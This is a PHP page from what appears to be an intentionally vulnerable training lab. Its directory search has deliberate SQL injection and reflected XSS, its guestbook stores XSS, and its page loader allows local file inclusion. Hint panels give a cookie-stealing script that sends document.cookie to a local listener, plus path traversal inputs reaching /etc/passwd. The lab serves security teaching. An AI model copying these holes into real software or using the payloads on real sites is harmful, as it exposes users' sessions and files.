<?php require __DIR__.'/header.php'; $db = require __DIR__.'/db.php'; ?>
<?php if (isset($_GET['reset'])): ?><div class="card" style="border-color:#2e9b4f">✅ Lab reset to a clean state (DB reseeded, guestbook &amp; uploads cleared).</div><?php endif; ?>

<div class="card">
  <h2>Directory search</h2>
  <form method="get">
    <input name="q" placeholder="search a colleague (e.g. alice)" value="<?php echo $_GET['q'] ?? ''; /* reflected XSS */ ?>">
    <br><br><button>Search</button>
  </form>
<?php
if (isset($_GET['q'])) {
    $q = $_GET['q'];
    // SQL injection: raw concatenation into the query.
    $sql = "SELECT username, email, role FROM users WHERE username LIKE '%$q%'";
    try {
        foreach ($db->query($sql) as $row) {
            echo "<div class='muted'>".$row['username']." &lt;".$row['email']."&gt; — ".$row['role']."</div>";
        }
    } catch (Exception $e) { echo "<div class='muted'>DB error: ".$e->getMessage()."</div>"; }
}
?>
</div>

<div class="card">
  <h2>Guestbook <span class="flag-pill">🏁 stored XSS</span></h2>
  <details class="muted" style="margin-bottom:10px">
    <summary style="cursor:pointer">💡 How to steal data with stored XSS (click)</summary>
    <ol style="line-height:1.8">
      <li>On Kali, start a listener: <code>python3 -m http.server 9001</code></li>
      <li>Post this as the <b>message</b> (not the name — the name is escaped):<br>
          <code>&lt;script&gt;new Image().src='http://127.0.0.1:9001/steal?c='+document.cookie&lt;/script&gt;</code></li>
      <li><b>Reload this page</b> → your listener logs <code>GET /steal?c=flag=FLAG{...}</code>. That cookie is the flag (a real session in a live app).</li>
    </ol>
  </details>
  <form method="post">
    <input name="author" placeholder="name">
    <br><br><textarea name="body" placeholder="leave a message"></textarea>
    <br><br><button>Post</button>
  </form>
<?php
if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['body'])) {
    $st = $db->prepare("INSERT INTO comments(author,body,created) VALUES (?,?,NOW())");
    $st->execute([$_POST['author'] ?? 'anon', $_POST['body']]);   // body stored raw
}
foreach ($db->query("SELECT author, body, created FROM comments ORDER BY id DESC") as $c) {
    // Stored XSS: body echoed without encoding.
    echo "<div class='card'><strong>".htmlspecialchars($c['author'])."</strong> <span class='muted'>".$c['created']."</span><br>".$c['body']."</div>";
}
?>
</div>

<div class="card">
  <h2>Page <span class="flag-pill">🏁 path traversal / LFI</span></h2>
  <details class="muted" style="margin-bottom:10px">
    <summary style="cursor:pointer">💡 This card includes <code>pages/&lt;name&gt;</code> — escape it with <code>../</code> (click)</summary>
    <ul style="line-height:1.8">
      <li>Normal use: <code>?page=about.html</code></li>
      <li>Traversal to the flag (outside the web root): <code>?page=../../lfi_secret/flag.txt</code> — only <b>2 ../</b> needed; extra <code>../</code> are harmless.</li>
      <li>System file (bonus): <code>?page=../../../../../../../etc/passwd</code> — needs enough <code>../</code> to reach <code>/</code> for your install (depth varies).</li>
    </ul>
  </details>
<?php
  $page = $_GET['page'] ?? 'home.html';
  // Local File Inclusion / path traversal: no sanitisation of the page name.
  @include __DIR__ . '/pages/' . $page;
?>
</div>

<?php require __DIR__.'/footer.php';
